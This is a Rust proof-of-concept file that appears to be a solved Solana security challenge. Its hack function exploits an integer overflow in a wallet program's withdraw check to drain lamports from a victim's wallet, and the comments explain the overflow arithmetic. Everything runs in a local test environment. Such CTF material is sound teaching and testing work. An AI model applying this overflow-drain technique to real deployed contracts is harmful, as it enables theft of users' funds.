use std::{env, str::FromStr};

use owo_colors::OwoColorize;
use poc_framework::solana_sdk::signature::Keypair;
use poc_framework::{
    keypair, solana_sdk::signer::Signer, Environment, LocalEnvironment, PrintableTransaction,
};
use solana_program::native_token::lamports_to_sol;

use pocs::assert_tx_success;
use solana_program::{native_token::sol_to_lamports, pubkey::Pubkey, system_program};
// need to pull these in
use borsh::BorshSerialize;
use solana_program::{
    instruction::{AccountMeta, Instruction},
    rent::Rent,
    sysvar,
};

struct Challenge {
    hacker: Keypair,
    wallet_program: Pubkey,
    wallet_address: Pubkey,
    wallet_authority: Pubkey,
}

// Do your hacks in this function here
fn hack(_env: &mut LocalEnvironment, _challenge: &Challenge) {
    /* Wallet is authorized now => can only withdraw from our wallet.
     * But as any wallet is owned by the contract, the lamports can be reduced by anyone wallet through overflows
     * we want to benefit from overflow => create hacker wallet
     * withdraw an overflow amount from hacker wallet (+) to victim wallet (-)
     */
    // create hackers wallet
    assert_tx_success(_env.execute_as_transaction(
        &[level2::initialize(
            _challenge.wallet_program,
            _challenge.hacker.pubkey(),
        )],
        &[&_challenge.hacker],
    ));
    let hacker_wallet =
        level2::get_wallet_address(_challenge.hacker.pubkey(), _challenge.wallet_program);

    // need to pass min_balance + amount <= hacker_wallet.lamports
    // RHS cannot be overflowed, so need to overflow LHS
    // at the same time amount needs to be minimized because it'll lead to a higher gain
    // due to how 2s complement numbers work (MAX_UINT = -1, MAX_UINT - 1 = -2, ...)
    // therefore, two constraints:
    // 1) overflow LHS, i.e. amount >= 2^64 - min_balance 2) minimize amount
    // meaning amount = 2^64 - min_balance is optimal
    let min_balance = Rent::default().minimum_balance(8);
    println!("Min balance: {}", min_balance);
    let overflow = (-(min_balance as i64)) as u64;
    println!("Overflow amount: {}", overflow);
    let mut hacker_profit: u64 = _env.get_account(hacker_wallet).unwrap().lamports;

    // move funds to our wallet
    let create_hack_instr = |_i: u64| -> Instruction {
        Instruction {
            program_id: _challenge.wallet_program,
            accounts: vec![
                AccountMeta::new(hacker_wallet, false), // wallet_info
                AccountMeta::new(_challenge.hacker.pubkey(), true), // authority
                AccountMeta::new(_challenge.wallet_address, false), // destination
                AccountMeta::new_readonly(sysvar::rent::id(), false),
            ],
            data: level2::WalletInstruction::Withdraw {
                amount: overflow,
            }
            .try_to_vec()
            .unwrap(),
        }
    };
    let tx = _env.execute_as_transaction(
        &[
            create_hack_instr(0),
            // need it a second time so the actual withdraw below can pass the min_balance + amount <= wallet_info.lamports assert
            create_hack_instr(1),
            // might need it several more times such that hacker_balance > 1 SOL test passes because we also paid gas
            // everytime our balance increases by -= -min_balance, i.e., +min_balance
            create_hack_instr(2),
        ],
        &[&_challenge.hacker],
    );
    tx.print_named("Hack: hacker overflow");

    // withdraw from our wallet
    // may only withdraw hacker_profit (not sure why current_balance - min_balance fails)
    hacker_profit = _env.get_account(hacker_wallet).unwrap().lamports - hacker_profit;
    println!("Hacker profit: {}", hacker_profit);
    let tx = _env.execute_as_transaction(
        &[Instruction {
            program_id: _challenge.wallet_program,
            accounts: vec![
                AccountMeta::new(hacker_wallet, false),
                AccountMeta::new(_challenge.hacker.pubkey(), true),
                AccountMeta::new(_challenge.hacker.pubkey(), false),
                AccountMeta::new_readonly(sysvar::rent::id(), false),
            ],
            data: level2::WalletInstruction::Withdraw { amount: hacker_profit }
                .try_to_vec()
                .unwrap(),
        }],
        &[&_challenge.hacker],
    );
    tx.print_named("Hack: hacker withdraw");
}

/*
SETUP CODE BELOW
*/
pub fn main() {
    let (mut env, challenge, internal) = setup();
    let before_balance = env.get_account(challenge.hacker.pubkey()).unwrap().lamports;
    hack(&mut env, &challenge);
    verify(&mut env, challenge, before_balance, internal);
}

struct Internal {
    wallet_authority: Keypair,
    wallet_amount: u64,
}

fn verify(
    env: &mut LocalEnvironment,
    challenge: Challenge,
    before_balance: u64,
    internal: Internal,
) {
    let after = env.get_account(challenge.hacker.pubkey()).unwrap().lamports;

    let tx = env.execute_as_transaction(
        &[level2::withdraw(
            challenge.wallet_program,
            challenge.wallet_authority,
            challenge.wallet_address,
            internal.wallet_amount,
        )],
        &[&internal.wallet_authority],
    );

    tx.print_named("Verification: authority withdraw");

    if tx.transaction.meta.unwrap().err.is_none() {
        println!(
            "[*] {}",
            "Original wallet authority successfully withdrew all funds.".red()
        )
    } else {
        println!(
            "[!] {}",
            "Original wallet authority cannot withdraw his funds anymore.".green()
        )
    }

    if after > before_balance {
        println!("[*] {}", "Congratulations, the exploit succeeded!".green());
        println!(
            "[*] Hacker has {} SOL more! ({} vs {})",
            lamports_to_sol(after - before_balance).green(),
            before_balance,
            after
        );
    } else {
        println!("[*] {}", "Exploit not successful.".red());
        println!(
            "[*] Hacker has {} SOL less! ({} vs {})",
            lamports_to_sol(before_balance - after).red(),
            before_balance,
            after
        );
    }
}

fn setup() -> (LocalEnvironment, Challenge, Internal) {
    let mut dir = env::current_exe().unwrap();
    let path = {
        dir.pop();
        dir.pop();
        dir.push("deploy");
        dir.push("level2.so");
        dir.to_str()
    }
    .unwrap();

    let wallet_program = Pubkey::from_str("W4113t3333333333333333333333333333333333333").unwrap();
    let wallet_authority = keypair(0);
    let rich_boi = keypair(1);
    let hacker = keypair(42);

    let a_lot_of_money = sol_to_lamports(1_000_000.0);

    let mut env = LocalEnvironment::builder()
        .add_program(wallet_program, path)
        .add_account_with_lamports(
            wallet_authority.pubkey(),
            system_program::ID,
            sol_to_lamports(100.0),
        )
        .add_account_with_lamports(rich_boi.pubkey(), system_program::ID, a_lot_of_money * 2)
        .add_account_with_lamports(hacker.pubkey(), system_program::ID, sol_to_lamports(1.0))
        .build();

    let wallet_address = level2::get_wallet_address(wallet_authority.pubkey(), wallet_program);

    // Create Wallet
    assert_tx_success(env.execute_as_transaction(
        &[level2::initialize(
            wallet_program,
            wallet_authority.pubkey(),
        )],
        &[&wallet_authority],
    ));

    println!("[*] Wallet created!");

    // rich boi pays for bill
    assert_tx_success(env.execute_as_transaction(
        &[level2::deposit(
            wallet_program,
            wallet_authority.pubkey(),
            rich_boi.pubkey(),
            a_lot_of_money,
        )],
        &[&rich_boi],
    ));
    println!("[*] rich boi payed his bills");

    (
        env,
        Challenge {
            wallet_address,
            hacker,
            wallet_program,
            wallet_authority: wallet_authority.pubkey(),
        },
        Internal {
            wallet_authority,
            wallet_amount: a_lot_of_money,
        },
    )
}
